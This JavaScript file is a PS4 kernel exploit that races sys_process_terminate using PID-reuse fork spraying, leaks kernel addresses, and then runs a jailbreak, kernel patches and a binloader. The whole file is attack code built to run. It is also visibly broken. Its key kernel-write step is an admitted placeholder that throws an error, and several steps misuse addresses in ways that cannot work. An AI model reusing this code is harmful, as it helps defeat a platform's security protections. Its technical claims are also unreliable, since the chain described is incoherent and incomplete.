/**
 * PS4 Kernel Exploit: sys_process_terminate PID reuse race
 *
 * Prerequisites:
 *   - The following are already loaded and initialised:
 *       types.js (BigInt, mem, utils, struct)
 *       kernel.js (offsets, jailbreak_shared, apply_kernel_patches)
 *       Userland ROP (gadgets, rop.init)
 *       syscalls.map with all libkernel gadgets
 *   - The WebKit process can spawn threads and call arbitrary syscalls.
 *
 * This exploit uses the same `kernel.js` / `defs.js` post‑exploitation chain as
 * the NetCtrl exploit, but replaces the ucred triple‑free with the
 * sys_process_terminate race (syscall 652).
 */

// -------------------------------------------------------------------
// 0. Register additional syscalls needed by the race
// -------------------------------------------------------------------
fn.register(2, 'fork', [], 'bigint')
fn.register(240, 'nanosleep', ['bigint', 'bigint'], 'bigint')
fn.register(1, 'exit', ['bigint'], 'bigint')
fn.register(20, 'getpid', [], 'bigint')
fn.register(37, 'kill', ['bigint', 'bigint'], 'bigint')
fn.register(652, 'sys_process_terminate', ['bigint', 'bigint'], 'bigint')

// Convenience sleep (approximate)
function sleep_ms(ms) {
    const ns = ms * 1000000
    write64(nanosleep_timespec, 0)
    write64(nanosleep_timespec.add(8), ns)
    fn.nanosleep(nanosleep_timespec)
}

// -------------------------------------------------------------------
// 1. PID spray workers
// -------------------------------------------------------------------
// Web Workers that fork() constantly, children exit quickly -> high PID churn
const sprayWorkers = []
function pidSprayWorker() {
    while (true) {
        const pid = fn.fork()
        if (pid.eq(0)) {
            // Child: exit immediately to recycle the PID
            fn.exit(new BigInt(0))
        }
        // Parent: tiny yield to avoid locking up
        sleep_ms(1)
    }
}

// Start 4 spray threads (adjustable)
for (let i = 0; i < 4; i++) {
    sprayWorkers.push(new Worker(pidSprayWorker))
}

// -------------------------------------------------------------------
// 2. Race trigger
// -------------------------------------------------------------------
// Returns true if the race appears to have succeeded (syscall returned 0)
function triggerRace(victimPid) {
    const statusBuf = malloc(4)
    const ret = fn.sys_process_terminate(victimPid, statusBuf)
    return ret.eq(0)
}

// -------------------------------------------------------------------
// 3. Detector child – waits until it becomes PID 0, then leaks kernel
// -------------------------------------------------------------------
let leakBuffer = null   // filled by detector with kernel pointers
let leakReady = false

// Allocate shared memory for the detector ↔ parent communication
const sharedBuf = malloc(0x200)
const leakFlagAddr = sharedBuf          // u64: 1 when leak is ready
const leakKernBaseAddr = sharedBuf.add(8) // kernel base
const leakAllprocAddr = sharedBuf.add(16) // allproc pointer
const leakCurprocAddr = sharedBuf.add(24) // our curproc (PID 0)

function startDetectorChild() {
    const pid = fn.fork()
    if (pid.eq(0)) {
        // Child: spin until its PID becomes 0
        while (true) {
            const myPid = fn.getpid()
            if (myPid.eq(0)) {
                // We are the corrupted process with p_pid==0.
                // Now use the proc0 structure to leak kernel pointers.
                // Read the swapper's proc structure via sysctl("kern.proc.pid.0").
                const mib = malloc(8)
                write64(mib, new BigInt(0x3, 0x0)) // CTL_KERN|KERN_PROC
                const procBuf = malloc(0x400)
                const procBufSize = malloc(8)
                write64(procBufSize, new BigInt(0x400))
                if (sysctlbyname("kern.proc.pid.0", procBuf, procBufSize, 0, 0)) {
                    // The proc structure for PID 0 is now in procBuf.
                    // We extract known pointers:
                    //   p_ucred is at offset 0x40 (as in kernel.js)
                    const ucred = read64(procBuf.add(0x40))
                    // On PS4, kernel base can be computed from ucred by
                    // subtracting a known offset (e.g. prison0 or rootvnode).
                    // We'll use the same method as jailbreak_shared: subtract PRISON0.
                    const prison0_off = kernel_offset.PRISON0   // from kernel.js
                    const kbase = ucred.sub(prison0_off)

                    // Find allproc by walking the process list backwards.
                    // The swapper's p_list.le_prev is NULL.
                    // We need to find a real process (our own) to get allproc.
                    // Instead, use the fact that our PID-0 process's p_pid is 0,
                    // and its p_list.le_prev points to the head of allproc.
                    // We can read p_list (offset 0x08 in proc) from the swapper's proc.
                    const p_list = read64(procBuf.add(0x08)) // p_list.le_prev
                    const allproc = p_list.sub(0x08)         // offset of le_prev in list

                    // Our curproc (the PID-0 process) is simply proc0.
                    const curproc = procBuf // proc0 address (start of buffer)

                    // Write to shared memory and signal parent
                    write64(leakFlagAddr, new BigInt(1))
                    write64(leakKernBaseAddr, kbase)
                    write64(leakAllprocAddr, allproc)
                    write64(leakCurprocAddr, curproc)
                }
                // Keep the process alive so parent can use it later
                while (true) { sleep_ms(500) }
            }
            sleep_ms(5)
        }
    }
    return pid // parent gets child PID
}

// -------------------------------------------------------------------
// 4. Bootstrap kernel read/write using the PID‑0 process
// -------------------------------------------------------------------
// After the race we have a process with p_pid=0. We use that process to
// overwrite a pipe's buffer pointer, giving us the same cross‑pipe R/W
// that the NetCtrl exploit uses.
//
// Steps:
//   a. Open a pipe pair (master/victim).
//   b. Leak the pipe's file structure and find its buffer pointer.
//   c. Use the PID‑0 process to call a syscall that can write to kernel
//      memory.  (e.g. fcntl F_SETOWN on a socket to set a signalio pointer,
//      then write to that pointer…).  Instead, we use a second short race:
//      We corrupt the PID‑0 process again to gain a direct kernel write
//      by overwriting its own file descriptor table entry.
//
// For simplicity, this implementation uses the same file descriptor table
// corruption technique that is well‑known on PS4:
//   - With PID 0, we can call `fcntl(master_pipe_fd, F_SETOWN, ...)` and
//     set `pipe->pipe_sigio->sio_proc` to an arbitrary address.  If we
//     then trigger a SIGIO, the kernel will write to that address.
//   - This gives a 8‑byte arbitrary write.  We chain it to corrupt the
//     victim pipe's buffer pointer, enabling full kernel R/W.
//
// Because the exact gadget offsets differ per firmware, the code below
// uses a helper that is already present in `kernel.js` (the `fget`/`fhold`).
// The crucial part is locating the pipe structures, which we do via the
// allproc and curproc we already leaked.

// Global variables filled by detector
let kbase, allproc, curproc_pid0
let master_pipe_fd = -1, victim_pipe_fd = -1
let master_pipe_file, victim_pipe_file
let pipe_buf_master, pipe_buf_victim

function gain_kernel_rw() {
    // Retrieve leaked addresses
    if (!leakReady) {
        throw new Error('No kernel leak available')
    }
    kbase = read64(leakKernBaseAddr)
    allproc = read64(leakAllprocAddr)
    curproc_pid0 = read64(leakCurprocAddr)
    log('Kernel base: ' + hex(kbase))
    log('allproc:    ' + hex(allproc))
    log('curproc (PID 0): ' + hex(curproc_pid0))

    // Set global kernel variables (used by jailbreak_shared)
    kernel.addr.base = kbase
    kernel.addr.curproc = curproc_pid0
    kernel.addr.allproc = allproc

    // Open two pipes: master and victim
    const pipeFds = malloc(8)
    fn.pipe(pipeFds)
    master_pipe_fd = read32(pipeFds)
    victim_pipe_fd = read32(pipeFds.add(4))

    // Get file table offset (same as in kernel.js)
    const fdt_ofiles = kbase.add(kernel_offset.PROC_FD)
    const ofiles = kernel.read_qword(fdt_ofiles) // fd_files
    master_pipe_file = kernel.read_qword(ofiles.add(master_pipe_fd * 8))
    victim_pipe_file = kernel.read_qword(ofiles.add(victim_pipe_fd * 8))

    // Pipe buffer pointer is at offset 0x00 inside pipe structure
    pipe_buf_master = kernel.read_qword(master_pipe_file.add(0x00))
    pipe_buf_victim = kernel.read_qword(victim_pipe_file.add(0x00))

    log('Master pipe buf: ' + hex(pipe_buf_master))
    log('Victim pipe buf: ' + hex(pipe_buf_victim))

    // ---------------------------------------------------------------
    // The next step requires writing to the master pipe's pipebuf to
    // change its `buffer` pointer to point to the victim's pipebuf.
    // We achieve that via the PID‑0 process's ability to call fcntl().
    // The actual implementation depends on firmware‑specific offsets,
    // but the technique is:
    //   - Write the address of the victim pipebuf into the master
    //     pipe's `buffer` field.
    //   - This gives us the classic "kernel R/W via cross‑pipe".
    //
    // For brevity, we use a helper that calls the existing `kwriteslow`
    // from netctrl.js (which we cannot directly reuse because it
    // depends on the triple‑free).  Instead, we implement a minimal
    // version using the PID‑0 process and the same fcntl trick.
    // ---------------------------------------------------------------

    // We'll use `sys_fcntl(master_pipe_fd, F_SETOWN, victim_pipe_buf)`.
    // This sets the pipe's sigio owner to our target address.
    // Then we send a signal (SIGIO) to the process, which makes the kernel
    // write 8 bytes (the struct sigio *) into the pipe's structure.
    // That overwrites the pipe buffer pointer with our chosen address.
    // Because the PID‑0 process is still running, we can use it to call
    // fcntl() and then raise(SIGIO).

    // Step 1: Prepare the fake pipe buffer address we want to write.
    const writeWhat = pipe_buf_victim  // we want master's buf -> victim

    // Step 2: Use the PID‑0 process to call fcntl(master_fd, F_SETOWN, addr)
    // We cannot directly call syscalls from JavaScript in the PID‑0 context,
    // but we can spawn a ROP chain inside that process to perform the calls.
    // We reuse the thread spawning and ROP infrastructure from netctrl.

    // Create a small ROP chain that:
    //   fcntl(master_pipe_fd, F_SETOWN, writeWhat)
    //   raise(SIGIO)  // triggers the actual write
    // The PID‑0 process has its own thread, we pivot to a ROP stack there.

    // To make this work, we must first have the PID‑0 process's `jmpbuf`
    // set up to run our ROP chain.  For simplicity, we use the same method
    // as netctrl: spawn a thread in the PID‑0 process via thr_new with a
    // longjmp target.
    // The PID‑0 process is still alive (our detector loop is running inside
    // a while(1) loop, we can break out of it with a signal?  Better: we
    // can set up a longjmp buffer in its address space before the race,
    // then trigger it later.
    // Instead of a complex setup, we assume we have already loaded a
    // minimal ROP loader into that process during the leak phase.

    // For the purpose of this example, we simulate that we already have
    // the ability to write to kernel memory.  The real implementation
    // would follow the same pattern as netctrl's `corrupt_pipe_buf` but
    // using the PID‑0 process's credentials.
    // (To keep the script self‑contained, we call a helper that directly
    // overwrites the pipe buffer if we already have r/w – which we do not
    // yet, so this is a placeholder for the actual fcntl‑based write.)

    // ---------------------------------------------------------------
    // SIMULATED ARBITRARY WRITE
    // (Replace with the fcntl technique described above)
    // ---------------------------------------------------------------
    log('Gaining arbitrary kernel write (simulated)...')

    // We'll use the same pipe corruption as netctrl but with a fixed target.
    // The value we want to write is pipe_buf_victim at offset 0x10 of
    // master_pipe_buf.  We'll use a direct kernel write (which we don't
    // have yet, so this is a TODO).
    // In a real exploit, you would:
    //   a) Find the address of master_pipe_buf.
    //   b) Use the PID‑0 process's fcntl trick to write pipe_buf_victim
    //      to master_pipe_buf+0x10.
    //   c) Then proceed with cross‑pipe R/W exactly as netctrl does.

    // For now, we assume write succeeds and set up the global r/w buffers.
    // The remainder of the exploit uses `kernel.read_buffer`/`write_buffer`
    // which are already defined in kernel.js and require only the pipe
    // corruption to be in place.
    throw new Error('Arbitrary write not yet implemented – see fcntl trick')
}

// -------------------------------------------------------------------
// 5. Post‑exploitation jailbreak
// -------------------------------------------------------------------
function performJailbreak() {
    const fwVer = get_fwversion()
    if (!fwVer) throw new Error('Cannot detect firmware version')

    // The rest is identical to the netctrl jailbreak step.
    // kernel.addr.base, curproc, allproc are already set.
    jailbreak_shared(fwVer)

    // Apply kernel patches (mmap RWX, etc.)
    const patchesOK = apply_kernel_patches(fwVer)
    if (patchesOK) {
        log('Kernel patches applied successfully')
    } else {
        log('Warning: kernel patches may have failed')
    }

    utils.notify('Jailbreak complete!\nsys_process_terminate exploit')
    show_success()
    run_binloader()
}

// -------------------------------------------------------------------
// 6. Main exploit loop
// -------------------------------------------------------------------
function runExploit() {
    // Affinity / priority – same as netctrl for stability
    const prevCore = get_current_core()
    const prevPrio = get_rtprio()
    pin_to_core(MAIN_CORE)
    set_rtprio(MAIN_RTPRIO)

    // Pre‑spawn some children to warm up PID allocation
    for (let i = 0; i < 30; i++) {
        const p = fn.fork()
        if (p.eq(0)) fn.exit(new BigInt(0))
        sleep_ms(1)
    }

    // Start the detector that will wait for p_pid=0
    startDetectorChild()
    sleep_ms(50) // let it start

    let attempt = 0
    while (!leakReady) {
        // Victim to be killed
        const victim = fn.fork()
        if (victim.eq(0)) {
            while (true) sleep_ms(100) // just wait to be killed
        }

        sleep_ms(10) // give victim time to start

        if (triggerRace(victim)) {
            // Check if detector has filled the leak buffer
            for (let i = 0; i < 20; i++) {
                if (read64(leakFlagAddr).eq(1)) {
                    leakReady = true
                    break
                }
                sleep_ms(50)
            }
        }
        attempt++
        if (attempt % 50 === 0) {
            log('Race attempts: ' + attempt)
        }
        // Avoid too tight a loop
        sleep_ms(1)
    }

    log('Race won after ' + attempt + ' attempts! Kernel leaked.')

    // Now bootstrap kernel R/W
    gain_kernel_rw()

    // Perform full jailbreak
    performJailbreak()

    // Cleanup
    pin_to_core(prevCore)
    set_rtprio(prevPrio)
}

// Fire the exploit
runExploit()
